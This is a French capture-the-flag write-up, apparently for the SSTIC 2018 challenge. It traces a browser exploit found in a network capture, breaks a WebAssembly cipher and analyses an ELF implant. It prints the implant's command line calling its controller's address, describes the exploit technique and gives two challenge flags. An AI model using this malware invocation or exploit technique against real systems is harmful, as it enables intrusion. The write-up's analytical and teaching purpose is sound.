Investigation de l'attaque
==========================

.. role:: raw-latex(raw)
     :format: latex

Ça commence bien...
-------------------

Le samedi 31 mars, en rentrant d'un dîner en famille à l'occasion du week-end de Pâques, je découvre le courriel suivant [#]_:

.. [#] sur le site web consacré au challenge du SSTIC, http://communaute.sstic.org/ChallengeSSTIC2018

.. code-block:: xorg

    From: marc.hassin@isofax.fr
    To: j.raff@goeland-securite.fr

    Bonjour,

    Nous avons récemment découvert une activité suspecte sur notre réseau. Heureusement
    pour nous, notre fine équipe responsable de la sécurité a rapidement mis fin à la
    menace en éteignant immédiatement la machine. La menace a disparu suite à cela, et une
    activité normale a pu être reprise sur la machine infectée.

    Malheureusement, nous avons été contraints par l'ANSSI d'enquêter sur cette intrusion
    inopinée. Après analyse de la machine, il semblerait que l'outil malveillant ne soit
    plus récupérable sur le disque. Toutefois, il a été possible d'isoler les traces réseau
    correspondantes à l'intrusion ainsi qu'à l'activité détectée.

    Nous suspectons cette attaque d'être l'œuvre de l'Inadequation Group, ainsi nommé du
    fait de ses optimisations d'algorithmes cryptographiques totalement inadéquates.
    Nous pensons donc qu'il est possible d'extraire la charge utile malveillante depuis la
    trace réseau afin d'effectuer un « hack-back » pour leur faire comprendre que ce
    n'était vraiment pas gentil de nous attaquer.

    Votre mission, si vous l'acceptez, consiste donc à identifier le serveur hôte utilisé
    pour l'attaque et de vous y introduire afin d'y récupérer, probablement, une adresse
    e-mail, pour qu'on puisse les contacter et leur dire de ne plus recommencer.

    Merci de votre diligence,

    Marc Hassin,
    Cyber Enquêteur
    Isofax SAS

Cela semble être une mission intéressante. Je télécharge donc la trace réseau sur https://static.sstic.org/challenge2018/challenge_SSTIC_2018.pcapng.gz, vérifie son condensat SHA-256 et ouvre Wireshark [#]_.

.. [#] Wireshark est un logiciel libre d'analyse de trafic réseau, https://www.wireshark.org/

Ce fichier contient 37714 paquets, émis ou reçus depuis l'adresse IP ``192.168.231.123``.
Il s'agit donc certainement de l'adresse IP de la machine qui a été attaquée.
De nombreux paquets de la trace réseau correspondent à des communications HTTP vers des sites web du journal Le Monde.
Il peut donc être intéressant de regarder si la machine compromise s'est connectée à d'autres sites web.
Wireshark permet d'obtenir rapidement de telles statistiques (cf. figure :raw-latex:`\ref{fig:http-stat}`).

.. raw:: latex

    \screenshotwr{.9\textwidth}{http-stat}{images/01_wireshark_http.png}{Statistiques des requêtes HTTP}

Les pages accédées sur http://10.241.20.18:8080 et http://10.141.20.18:8080 ont des noms plutôt suspicieux.
J'extrais donc de la trace réseau les fichiers téléchargés, qui correspondent aux URL suivantes (dans l'ordre dans lequel elles apparaissent dans la trace réseau):

* http://10.241.20.18:8080/stage1.js
* http://10.241.20.18:8080/utils.js
* http://10.241.20.18:8080/blockcipher.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1
* http://10.141.20.18:8080/blockcipher.wasm?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1
* http://10.241.20.18:8080/payload.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1
* http://10.241.20.18:8080/stage2.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1

Les fichiers utilisant l'extension ``.js`` sont des scripts JavaScript et celui utilisant ``.wasm`` un programme WebAssembly[#]_.
Avant de se plonger dans l'analyse de ces fichiers, je me suis demandé ce qui avait conduit la machine infectée à télécharger ces fichiers.
En cherchant « ``10.141.20.18`` » dans la trace réseau, Wireshark trouve une communication HTTP avec ``www.theregister.co.uk``:

.. [#] WebAssembly est un format d'instructions qui encode des programmes pouvant s'exécuter dans des navigateurs web (http://webassembly.org/). Pour permettre l'exécution de programmes arbitraires de manière sécurisée, il impose beaucoup de restrictions dans les actions qu'il est possible d'implémenter. Certaines personnes considèrent ces restrictions suffisantes pour même pouvoir repenser la manière de concevoir la séparation usuelle applications/noyau des systèmes d'exploitation et exécuter du code traditionnellement applicatif en espace noyau (https://github.com/nebulet/nebulet).

.. code-block:: html

    GET / HTTP/1.1
    Host: www.theregister.co.uk
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    ...

    HTTP/1.1 200 OK
    Date: Thu, 29 Mar 2018 15:09:15 GMT
    ...

    <!doctype html>
    <html lang="en">
    ...
    </div>
    <script src="http://10.241.20.18:8080/stage1.js"></script></body>
    </html>

Cette communication HTTP a lieu entre les adresses IP ``192.168.231.123`` et ``104.20.251.41``, qui correspondent respectivement à la machine compromise et à une adresse IP légitime du site web de The Register[#]_.

.. [#] une résolution DNS de www.theregister.co.uk donne ``104.20.250.41`` et ``104.20.251.41``

Ainsi, l'intrusion sur la machine qui a été attaquée a débuté par la visite de l'utilisateur de la machine sur http://www.theregister.co.uk, qui a déclenché l'exécution du script JavaScript ``stage1.js``.
Les éléments présents dans la trace réseau ne permettent pas de déterminer si le site de The Register a été compromis ou si la balise ``<script>`` servant à télécharger ``stage1.js`` a été injectée dans la réponse au cours de son acheminement.


Un navigateur bien vulnérable
-----------------------------

JavaScript et la mémoire partagée
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Le script ``stage1.js`` contient du code JavaScript plutôt lisible (les noms des fonctions sont cohérents avec leurs contenus, des commentaires sont présents, le code est aéré, etc.).
La lecture de ce script permet de comprendre qu'il exploite une vulnérabilité du navigateur afin d'exécuter un programme malveillant.
Comme les en-têtes HTTP émis par la machine compromise correspondent à l'utilisation de Firefox 53.0 sur Linux[#]_, il s'agit du navigateur utilisé. Les étapes du script sont les suivantes:

.. [#] les en-têtes HTTP contiennent « ``User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0`` »

* Le script commence par allouer un objet ``SharedArrayBuffer`` nommé ``sab`` et crée un objet ``sab_view`` qui permet de consulter le contenu de la mémoire associée à ``sab``.
* La fonction ``doit`` [#]_ crée suffisamment de tâches (« workers ») pour générer :raw-latex:`$2^{32}$` références supplémentaires à ``sab``.
* Selon les commentaires présents dans le script, cela provoque un dépassement de capacité du compteur de références à ``sab`` (qui est probablement un nombre de 32 bits). Un appel à ``delete`` conduit alors à la libération de la mémoire (car le compteur de références passe alors à zéro au lieu de :raw-latex:`$2^{32}$`).
* Le script charge alors quelques scripts JavaScript supplémentaires et appelle quelques fonctions avant d'appeler la fonction ``pwn``.
* Cette fonction alloue un certain nombre d'objets ``ArrayBuffer`` et cherche ensuite dans ``sab_view`` un de ces objets. Cela est possible, car ``sab_view`` fait référence à une zone mémoire non-allouée, dans laquelle un ``ArrayBuffer`` peut se retrouver maintenant alloué.
* Une fois cela fait, le script définit ``memory.write``, ``memory.read`` et ``memory.readWithTag``, qui sont des fonctions utilisant l'objet ``ArrayBuffer`` trouvé et ``sab_view`` pour lire et écrire dans la mémoire du processus en cours d'exécution (qui est un processus du navigateur web).
* Cet accès à la mémoire permet ensuite de trouver des éléments permettant l'exécution de code arbitraire, en utilisant des techniques de « programmation orientée retour » (ROP[#]_).
* Ces éléments sont utilisés dans la fonction ``drop_exec`` pour créer un fichier à l'emplacement ``/tmp/.f4ncyn0un0urs`` et l'exécuter.

.. [#] « do it » peut être traduit en « fait cela » et n'a rien à voir avec le verbe « devoir »
.. [#] « Return Oriented Programming », https://fr.wikipedia.org/wiki/Return-oriented_programming

En résumé, ``stage1.js`` exploite une vulnérabilité de type dépassement de capacité du compteur de références afin d'écrire et exécuter un fichier.

Le contenu du fichier qui est créé provient de la fonction ``decryptAndExecPayload``, qui est définie dans ``stage2.js``.
Cette fonction déchiffre le contenu de ``payload.js`` à l'aide d'un mot de passe téléchargé depuis https://10.241.20.18:1443/password?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1 et en utilisant un algorithme de déchiffrement implémenté par la fonction ``Module._decryptBlock``.
Cette fonction est définie dans ``blockcipher.js`` (je pouvais m'y attendre, comme le nom du fichier signifie littéralement « chiffrement par bloc ») et fait simplement appel à une fonction chargée depuis http://10.141.20.18:8080/blockcipher.wasm?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1.

La manière la plus simple pour déchiffrer un message chiffré est d'en obtenir la clé, qui est calculée à partir du mot de passe utilisé.
Je m'intéresse donc à la manière dont ce mot de passe est obtenu.
Dans la trace réseau, il n'y a qu'un seul flux qui correspond à une communication TLS avec ``10.241.20.18:1443`` (cf. figure :raw-latex:`\ref{fig:https-password}`).
L'analyse de ce flux permet d'obtenir le certificat TLS utilisé, qui est un certificat autosigné avec les caractéristiques suivantes (et leurs traductions en français):

* ``C = RU``: « pays: Russie »
* ``ST = Moscow``: « État ou province: Moscou »
* ``O = APT28``: « organisation: APT28[#]_ »
* ``CN = legit-news.ru``: « nom de domaine: legit-news.ru »

.. [#] https://fr.wikipedia.org/wiki/Fancy_Bear

.. raw:: latex

    \screenshotwr{.9\textwidth}{https-password}{images/01_https_password.png}{Communication HTTPS relative au mot de passe de chiffrement}

Il s'agit donc d'un certificat qui indique des informations relatives à un groupe d'attaquants supposés russes.
Le fait qu'un tel certificat soit utilisé par une machine suffit à conclure que cette machine a pu être compromise, mais ne permet pas d'attribuer l'attaque de manière fiable.

De plus la trace réseau révèle que le téléchargement du mot de passe en HTTPS a utilisé la suite cryptographique ``TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`` avec une clé RSA de 2048 bits, ce qui est conforme au RGS[#]_.

.. [#] « le référentiel général de sécurité (RGS) est le cadre règlementaire permettant d’instaurer la confiance dans les échanges au sein de l’administration et avec les citoyens », https://www.ssi.gouv.fr/entreprise/reglementation/confiance-numerique/le-referentiel-general-de-securite-rgs/

Ainsi, le mot de passe utilisé pour déchiffrer ``/tmp/.f4ncyn0un0urs`` à partir de ``payload.js`` est protégé efficacement par la communication HTTPS qui a eu lieu avec ``10.241.20.18:1443``.
Pour trouver comment décrypter ce fichier, je vais donc me concentrer sur l'algorithme de déchiffrement qui a été utilisé.

L'assembleur du web
~~~~~~~~~~~~~~~~~~~

L'algorithme utilisé pour déchiffrer les données présentes dans ``payload.js`` fonctionne de la manière suivante:

* Les données commencent par être traitées par la fonction ``deobfuscate`` de ``stage2.js``, qui applique la fonction suivante à chacun des octets: :raw-latex:`$d(x) = (200 x^2 + 255 x + 92) \mbox{ mod } 256$`.
* Le début des données obtenues correspond à un sel cryptographique (« salt », de 16 octets) et à un vecteur d'initialisation (« IV », de 16 octets).
* Le mot de passe de déchiffrement est dérivé en utilisant l'algorithme PBKDF2 [#]_ avec le sel obtenu et :raw-latex:`$1000000$` itérations de SHA-256.
* La fonction ``Module._setDecryptKey`` est appelée avec la clé de déchiffrement obtenue par PBKDF2.
* Les données sont découpées en blocs de 16 octets et déchiffrées en utilisant le mode CBC [#]_ et la fonction ``Module._decryptBlock``.
* Si le premier bloc déchiffré est ``-Fancy Nounours-`` [#]_, le déchiffrement a réussi et les données déchiffrées sont situées dans les blocs suivants. Sinon, le déchiffrement a échoué.

.. [#] PKCS #5: Password-Based Cryptography Specification Version 2.0, https://tools.ietf.org/html/rfc2898
.. [#] « Cipher Block Chaining », https://fr.wikipedia.org/wiki/Mode_d%27op%C3%A9ration_(cryptographie)
.. [#] ce texte occupe 16 caractères ASCII, donc correspond bien à un bloc de 16 octets

Le cœur de l'algorithme de déchiffrement est donc implémenté dans deux fonctions (``_setDecryptKey`` et ``_decryptBlock``). Celles-ci sont implémentées dans le programme WebAssembly ``blockcipher.wasm``.

Pour analyser le programme WebAssembly, plusieurs outils existent: WABT [#]_, wasmdec [#]_, etc. Après quelques essais, j'installe WABT, qui propose une commande ``wasm2c`` qui convertit le WebAssembly pseudo-compilé en instructions C. En effet, les fichiers ``.wasm`` sont des programmes contenant du code compilé en un langage intermédiaire permettant d'être exécuté sur tout type de processeur. Comme ce langage intermédiaire possède un jeu d'instructions relativement restreint, il est possible de convertir ces instructions en C et de produire ainsi des programmes lisibles.

.. [#] https://github.com/WebAssembly/wabt
.. [#] https://github.com/wwwg/wasmdec

La lecture du code ``blockcipher.wasm`` permet de trouver une fonction ``_getFlag`` qui prend deux arguments.
Si le premier est un entier égal à ``0x5571c18`` [#]_, alors 48 octets issus d'un traitement sur des données contenues dans le programme WebAssembly sont copiés à l'emplacement mémoire indiqué par le second argument.
Ce traitement ressemble à un algorithme de déchiffrement construit autour d'une dérivation de clé en 32 sous-clés suivie d'une itération de 32 tours d'un algorithme utilisant des opérations binaires classiques (addition, OU exclusif et rotation de bits).
Après quelques discussions, un ami cryptographe m'informe que l'algorithme employé correspond à Speck[#]_, un algorithme publié par la National Security Agency (NSA) en 2013.
Comme les données du programme WebAssembly contiennent aussi bien les données chiffrées (48 octets) que la clé (de 16 octets), il est possible d'utiliser la fonction ``_getFlag`` sans connaître le mot de passe qui a été transmis en HTTPS, mais simplement en appelant la fonction avec la valeur ``0x5571c18``.
Cette fonction est utilisée dans ``stage2.js`` par la fonction ``getFlag``, qui implémente tout ce qui est nécessaire pour exécuter le programme WebAssembly.

.. [#] il s'agit du texte « SSTIC 18 » en hexspeak
.. [#] https://en.wikipedia.org/wiki/Speck_(cipher)

En adaptant le script JavaScript afin de pouvoir directement appeler ``getFlag(0x5571c18)``, j'obtiens finalement le contenu de 48 octets déchiffré. Il s'agit d'un flag permettant d'effectuer la première validation intermédiaire, qui est nommé « Anomaly Detection » dans la page wiki du challenge:

.. raw:: latex

    \intermediateflag{Anomaly Detection}{SSTIC2018\{3db77149021a5c9e58bed4ed56f458b7\}}

Du chiffrement Russe
~~~~~~~~~~~~~~~~~~~~
:raw-latex:`\label{sect:1-chiffrement-russe}`

En utilisant ``wasm2c`` sur ``blockcipher.wasm`` et en lisant le code C produit, j'arrive à déterminer le fonctionnement de ``_setDecryptKey`` et ``_decryptBlock``.
Ces fonctions sont construites autour de trois fonctions, que j'appelle :raw-latex:`$P$`, :raw-latex:`$S$` et :raw-latex:`$D$`.

La fonction :raw-latex:`$P$` (pour « polynôme ») applique 16 fois une transformation sur un bloc de 16 octets qui fonctionne comme un registre à décalage à rétroaction linéaire[#]_: le bloc (« registre ») de 16 octets est décalé de 16 octets vers la fin, la valeur du premier octet est issue d'opérations combinant les différents octets avec un bloc de 15 octets présent à la position ``0x119`` des données du programme WebAssembly, et le tout est tronqué à 16 octets de nouveau.
Les opérations effectuées ressemblent à la manière dont peut être implémenté un algorithme utilisant un corps fini à  :raw-latex:`$2^8$` éléments (:raw-latex:`$\mathbbm{F}_{256}$`) qui est construit en quotientant l'anneau des polynômes sur :raw-latex:`$\mathbbm{F}_2$` par le polynôme :raw-latex:`$X^8 + X^7 + X^6 + X + 1$`, dont les éléments peuvent être représentés par une séquence de 8 bits (donc un octet).
Ce corps fini peut être noté :raw-latex:`$GF(2^8)$` dans la littérature anglophone, et la section « 2. Mathematical preliminaries » de la spécification d'AES[#]_ contient une bonne introduction aux opérations dans un tel corps fini.

.. [#] https://fr.wikipedia.org/wiki/Registre_%C3%A0_d%C3%A9calage_%C3%A0_r%C3%A9troaction_lin%C3%A9aire
.. [#] https://csrc.nist.gov/csrc/media/projects/cryptographic-standards-and-guidelines/documents/aes-development/rijndael-ammended.pdf

Il arrive souvent que les opérations faisant intervenir des polynômes dans les algorithmes de chiffrement possèdent des propriétés de linéarité.
C'est le cas pour la fonction :raw-latex:`$P$`: si :raw-latex:`$A$` et :raw-latex:`$B$` sont deux blocs de 16 octets, :raw-latex:`$P(A \oplus B) = P(A) \oplus P(B)$` (avec :raw-latex:`$\oplus$` le OU exclusif bit-à-bit). Cette fonction est utilisée par ``_setDecryptKey``, et sa réciproque (notée :raw-latex:`$P^{-1}$`) est utilisée par ``_decryptBlock``.

La fonction :raw-latex:`$S$` (pour « substitution ») agit sur chacun des octets d'un bloc de 16 octets. Elle remplace chaque octet par la valeur correspondante dans un tableau de 256 éléments présent dans les données du fichier ``blockcipher.wasm``. Cela correspond traditionnellement à un composant « S-Box » dans un algorithme de chiffrement, et permet d'y apporter des propriétés de non-linéarité (en général, il est plutôt souhaitable qu'un algorithme de chiffrement ne soit pas linéaire).

La fonction :raw-latex:`$D$` (pour « déobfuscation ») correspond à la fonction ``d`` de ``stage2.js`` (qui est utilisable depuis le programme WebAssembly par le biais de ``Module.d``), appliquée à chacun des octets d'un bloc de 16 octets.

Ces fonctions permettent de comprendre le fonctionnement des algorithmes implémentés par les fonctions ``_setDecryptKey`` et ``_decryptBlock``.
``_setDecryptKey`` divise la clé de déchiffrement de 32 octets en deux blocs 16 octets, notés :raw-latex:`$X_0$` et :raw-latex:`$Y_0$`, et effectue 32 itérations d'applications successives des fonctions :raw-latex:`$P$`, :raw-latex:`$S$`, :raw-latex:`$D$` et OU exclusif.

En notant :raw-latex:`$[0,0...0,i]$` un bloc de 16 octets contenant 15 octets nuls suivis du nombre :raw-latex:`$i$`, et :raw-latex:`$(X_i, Y_i)$` les deux blocs de 16 octets obtenus après la i:sup:`e` itérations, l'algorithme de dérivation de clé peut s'écrire:

.. raw:: latex

    \begin{eqnarray*}
      X_{i+1} &=& P(D(S(P([0,0...0,i+1]) \oplus X_i)) \oplus Y_i \\
      Y_{i+1} &=& X_i
    \end{eqnarray*}

``_setDecryptKey`` enregistre dans le « contexte » de déchiffrement (variable ``ctx`` de ``decryptData`` dans ``stage2.js``) les valeurs de 10 blocs de 16 octets: :raw-latex:`$X_0$`, :raw-latex:`$Y_0$`, :raw-latex:`$X_8$`, :raw-latex:`$Y_8$`, :raw-latex:`$X_{16}$`, :raw-latex:`$Y_{16}$`, :raw-latex:`$X_{24}$`, :raw-latex:`$Y_{24}$`, :raw-latex:`$X_{32}$` et :raw-latex:`$Y_{32}$`.

La fonction ``_decryptBlock`` déchiffre un bloc de 16 octets :raw-latex:`$B$` en suivant le schéma suivant:

.. raw:: latex

    \input{images/01_decrypt_block.tikz.tex}

Soit mathématiquement:

.. raw:: latex

    \begin{eqnarray*}
      \mbox{\_decryptBlock}(B) &=& S(X_0 \oplus D(S(P^{-1}( ... \oplus D(S(P^{-1}(X_{32} \oplus D(S(P^{-1}(Y_{32} \oplus B))) ))) ... ))) )
    \end{eqnarray*}

Cet algorithme de chiffrement correspond peut-être à un algorithme spécifié.
Pour le savoir, je cherche les constantes qui interviennent dans :raw-latex:`$P$`: ``94 20 85 10 c2 c0 01 fb 01 c0 c2 10 85 20 94`` (qui sont les 15 octets utilisés pour les opérations de transformation).
Je trouve ainsi une référence à Kuznyechik [#]_, un algorithme défini dans GOST R 34.12-2015 (RFC 7801)[#]_.
Cela semble correspondre pour la fonction :raw-latex:`$P$`, mais Kuznyechik n'utilise pas la fonction :raw-latex:`$D$`, et la fonction :raw-latex:`$S$` est peut-être différente.

.. [#] https://en.wikipedia.org/wiki/Kuznyechik
.. [#] https://tools.ietf.org/html/rfc7801

Je cherche donc à simplifier l'algorithme implémenté par ``_decryptBlock`` en combinant :raw-latex:`$S$` et :raw-latex:`$D$`.
Pour réaliser cela, je calcule le résultat de l'application de la fonction ``d`` de ``stage2.js`` sur le tableau qui permet de définir :raw-latex:`$S$`.
Je me rends compte que le tableau que j'obtiens alors est [0, 1, 2, 3... 255], c'est à dire la fonction identité !
Ainsi, ``_decryptBlock`` peut être réécrite:

.. raw:: latex

    \begin{eqnarray*}
      \mbox{\_decryptBlock}(B) &=& S(X_0 \oplus D(S(P^{-1}( ... \oplus D(S(P^{-1}(X_{32} \oplus D(S(P^{-1}(Y_{32} \oplus B))) ))) ... ))) ) \\
      &=& S(X_0 \oplus P^{-1}( ... \oplus P^{-1}(X_{32} \oplus P^{-1}(Y_{32} \oplus B) ) ... ) )
    \end{eqnarray*}

Or, :raw-latex:`$P$` est linéaire donc sa réciproque :raw-latex:`$P^{-1}$` aussi, ce qui permet de simplifier cette équation:

.. raw:: latex

    \begin{eqnarray*}
      P^{-1}(Y_{32} \oplus B) &=& P^{-1}(Y_{32}) \oplus P^{-1}(B) \\
      P^{-1}(X_{32} \oplus P^{-1}(Y_{32} \oplus B) &=& P^{-1}(X_{32}) \oplus P^{-1}(P^{-1}(Y_{32})) \oplus P^{-1}(P^{-1}(B)) \\
      &\ldots& \\
      \mbox{\_decryptBlock}(B) &=& S(C_K \oplus P^{-1}(P^{-1}(P^{-1}(P^{-1}(P^{-1}(P^{-1}(P^{-1}(P^{-1}(P^{-1}(B)))))))))) \\
      &=& S(C_K \oplus (P^{-1})^9(B))
    \end{eqnarray*}

où :raw-latex:`$C_K$` est un bloc de 16 octets qui ne dépend que de la clé de chiffrement et non du message chiffré. Sa valeur peut être obtenue en connaissant un bloc et son chiffré, en ajustant la dernière équation:

.. raw:: latex

    \begin{eqnarray*}
      C_K &=& S^{-1}(\mbox{bloc clair}) \oplus (P^{-1})^9(\mbox{bloc chiffré})
    \end{eqnarray*}

En utilisant le vecteur d'initialisation, le fait que le premier bloc clair doit être ``-Fancy Nounours-`` et que le bloc chiffré correspondant est constitué des 16 premiers octets chiffrés, j'ai réussi à déterminer le contenu de :raw-latex:`$C_K$`, et ainsi à réimplémenter ``_decryptBlock`` sans connaître la clé de chiffrement.
Ceci me permet de finalement décrypter le contenu de ``payload.js``, qui correspond à ce qui a été écrit dans ``/tmp/.f4ncyn0un0urs`` lorsque l'attaque a eu lieu[#]_.

.. [#] le script Python que j'utilise pour implémenter cela se trouve à l'annexe :raw-latex:`\ref{sect:ann-decrypt-payload}`

Un ourson fantaisiste
---------------------

Un ELF avec un drapeau
~~~~~~~~~~~~~~~~~~~~~~
:raw-latex:`\label{sect:1-ourson-fantaisiste}`

Après avoir écrit le contenu de ``/tmp/.f4ncyn0un0urs``, l'exploit présent dans ``stage1.js`` exécute ce fichier avec la ligne de commande suivante:

.. code-block:: sh

    /tmp/.f4ncyn0un0urs -h 192.168.23.213 -p 31337

Les arguments du programme contiennent donc une nouvelle adresse IP, ``192.168.23.213``.
Afin de voir s'il s'agit réellement d'une adresse IP utilisée et comment elle est utilisée, il est nécessaire d'analyser ce qu'effectue le programme.
Maintenant que j'en ai décrypté le contenu, les outils usuels d'analyse peuvent être mis en œuvre.

.. code-block:: sh

    $ file .f4ncyn0un0urs
    .f4ncyn0un0urs: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically
    linked, for GNU/Linux 3.2.0, BuildID[sha1]=dec6817fc8396c9499666aeeb0c438ec1d9f5da1,
    not stripped

    $ strings .f4ncyn0un0urs| grep SSTIC
    SSTIC2018{f2ff2a7ed70d4ab72c52948be06fee20}

Il s'agit d'un programme pour Linux, au format ELF[#]_ 64-bits, qui a été lié statiquement (i.e. qui n'utilise pas de bibliothèques liées dynamiquement) et qui contient un flag de validation intermédiaire:

.. [#] c'est le format habituel des programmes Linux

.. raw:: latex

    \intermediateflag{Disruptive JavaScript}{SSTIC2018\{f2ff2a7ed70d4ab72c52948be06fee20\}}

En ouvrant le programme dans un désassembleur comme IDA, je remarque que les noms des fonctions sont présents [#]_ et que la fonction ``main`` appelle deux fonctions: ``agent_init`` et ``agent_main_loop``.
Le programme est donc probablement un « agent » qui exécute des actions provenant d'ailleurs.
La fonction ``agent_init`` analyse les arguments du programme, initialise une structure interne en appelant quelques fonctions, dont les suivantes:

.. [#] il peut arriver que ces informations soient retirées après la compilation du programme, par l'utilisation de la commande ``strip`` par exemple. La présence de ces informations est d'ailleurs visible dans le résultat de la commande ``file``, qui indique « not stripped »

* ``init_genPrime``
* ``rsa2048_gen``
* ``fini_genPrime``
* ``routing_table_init``

Les trois premières utilisent la bibliothèque GMP [#]_ pour générer un bi-clé RSA [#]_.
Ensuite, si le programme est appelé avec l'option ``-c``, un filtre SECCOMP [#]_ est mis en place.
Sinon, ``agent_init`` appelle les fonction ``scomm_connect`` et ``scomm_prepare_channel``, qui initient une connexion TCP/IP à l'adresse et au port indiqués par les options ``-h`` et ``-p`` du programme.
Enfin, ``agent_init`` termine en appelant les fonctions ``scomm_init`` et ``scomm_bind_listen``, ouvrant ainsi un port TCP en écoute (indiqué par l'option ``-l`` du programme ou 31337 par défaut).
Afin de comprendre le protocole de communication utilisé sur TCP/IP, je commence par m'intéresser aux fonctions relatives à l'établissement d'un canal de communication et à la transmission et à la réception des messages.

.. [#] la « GNU Multiple Precision Arithmetic Library » (GMP) est une bibliothèque de code qui permet d'effectuer des calculs (opérations arithmétiques) utilisant des nombre entiers de taille arbitraire, sans limitation à 32 ou 64 bits par exemple
.. [#] RSA est un algorithme de chiffrement asymétrique qui met en œuvre deux clés. La *clé privée* sert au déchiffrement et est secrète donc jamais communiquée, et la *clé publique* sert au chiffrement et peut être communiquée sans affaiblir la protection en confidentialité apportée par l'usage de RSA.
.. [#] http://man7.org/linux/man-pages/man2/seccomp.2.html

Du chiffrement quasiment à l'état de l'art
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

D'après son nom, la fonction ``scomm_prepare_channel`` devrait permettre de préparer un canal de communication sécurisée (en imaginant que « scomm » signifie « secure communication »).
Cette fonction appelle d'autres fonctions, nommées ``aes_genkey``, ``rsa2048_key_exchange``, ``rijndaelKeySetupEnc`` et ``rijndaelKeySetupDec``.
Ces noms permettent de comprendre qu'un algorithme d'échange de clés est utilisé pour définir deux clés AES [#]_, l'une utilisée pour le chiffrement l'autre pour le déchiffrement.
L'analyse des fonctions ``scomm_send`` et ``scomm_recv`` permet de déduire que la clé de chiffrement est utilisée pour chiffrer des données envoyées et que la clé de déchiffrement est utilisée pour déchiffrer des données reçues.
Le chiffrement et le déchiffrement utilisent le mode CBC avec des blocs de 16 octets (128 bits) et un vecteur d'initialisation transmis en préfixe de la communication.
Ces fonctions utilisent les fonctions ``rijndaelEncrypt`` et ``rijndaelDecrypt`` pour chiffrer et déchiffrer un bloc, qui utilisent des grands tableaux de 256 nombres entiers de 32 bits nommés ``Te0``, ``Te1``, ..., ``Te4`` et ``Td0``, ..., ``Td4``.
Une rapide recherche sur internet permet de s'assurer que ces tableaux contiennent bien les constantes habituellement trouvées dans les implémentations d'AES utilisant des tables de correspondance [#]_.

.. [#] AES et Rijndael sont des algorithmes de chiffrement symétriques très semblables, AES étant le résultat de la standardisation de Rijndael. Comme ``/tmp/.f4ncyn0un0urs`` semble utiliser les deux noms, je choisis ici de n'utiliser que le nom « AES », même si l'algorithme effectivement utilisé est une variante d'AES.
.. [#] https://github.com/cforler/Ada-Crypto-Library/blob/a9c201d586f31b475802e04dfa1441e50d18d9ff/src/crypto-symmetric-algorithm-aes-tables.ads par exemple.

Les fonctions ``rijndaelEncrypt`` et ``rijndaelDecrypt`` prennent chacune 4 arguments:

* une structure contenant les sous-clés dérivées des clés AES utilisées (par ``rijndaelKeySetupEnc`` et ``rijndaelKeySetupDec``) ;
* le nombre de tours à effectuer ;
* l'adresse d'un bloc de 16 octets correspondant aux données à traiter (i.e. un « buffer source ») ;
* l'adresse d'un bloc de 16 octets où le résultat est écrit (i.e. un « buffer destination »).

Dans leurs appels à ces fonctions, ``scomm_send`` et ``scomm_recv`` utilisent 4 pour le nombre de tours, ce qui résulte en un chiffrement AES à 4 tours.
Comme AES utilise normalement au moins 10 tours, cette réduction du nombre de tours peut avoir pour effet d'affaiblir le chiffrement.
Dans le cas présent, il existe une attaque nommée « Attaque intégrale » (ou « Square attack ») qui permet de retrouver la clé de chiffrement très rapidement.
Cette attaque nécessite de disposer du résultat du chiffrement de 256 blocs qui ne diffèrent que d'un octet (i.e. un octet du message qui est chiffré a pris ses 256 valeurs possibles sans que les autres octets changent).

Une communication tracée
~~~~~~~~~~~~~~~~~~~~~~~~
:raw-latex:`\label{sect:1-comm-tracee}`

En revenant à la trace réseau initiale, il est possible de trouver une communication avec l'adresse IP et le port TCP qui ont été utilisés lors de l'exécution de ``/tmp/.f4ncyn0un0urs`` au moment de l'intrusion (``192.168.23.213:31337``), émise depuis ``192.168.231.123``.
Cette communication commence par 4 paquets de 256 octets, puis des paquets de tailles diverses sont échangés. La lecture de ``rsa2048_key_exchange`` permet de comprendre que:

* le premier paquet correspond à l'envoi de la clé publique RSA-2048 [#]_ de l'agent (``192.168.231.123``) au serveur qu'il contacte (``192.168.23.213``) ;
* le second correspond à l'envoi de la clé publique RSA-2048 du serveur à l'agent ;
* le troisième correspond à l'envoi de la clé de déchiffrement AES chiffrée avec la clé publique RSA du serveur, de l'agent au serveur ;
* le quatrième correspond à la clé de chiffrement AES qu'utilisera l'agent, qui est chiffrée avec sa clé publique et qui est envoyée par le serveur.

.. [#] Une clé publique RSA-2048 est constituée d'un module de 2048 bits (256 octets) et d'un exposant. Comme ``.f4ncyn0un0urs`` utilise toujours 65537 comme exposant (ce qui correspond à ``0x10001`` en hexadécimal), l'exposant n'est pas transmis sur le réseau.

Sans connaître les clés privées RSA utilisées, il n'est normalement pas possible de trouver les clés AES ainsi échangées à partir de la trace réseau. Je me concentre donc sur les paquets suivants, qui sont émis par la fonction ``scomm_send`` et décodés par la fonction ``scomm_recv``.
Ces paquets ont la structure suivante:

* un nombre entier de 4 octets (32 bits petit boutiste), qui déclare la taille des données qui suivent (vecteur d'initialisation et blocs chiffrés) ;
* un bloc de 16 octets (128 bits), qui définit le vecteur d'initialisation utilisé par le chiffrement AES-CBC des données qui suivent ;
* des blocs de 16 octets, qui sont des données chiffrées en AES-CBC.

En observant les paquets, je me rends compte que le vecteur d'initialisation est incrémental pour chacun des deux sens de communication: pour les données reçues par l'agent, il commence par ``00 00 00 00 ... 00``, puis celui du paquet reçu suivant est ``00 00 00 00 ... 01``, puis ``00 ... 02``, ``00 ... 03``, etc. ; et cela est également le cas pour les données envoyées par l'agent.
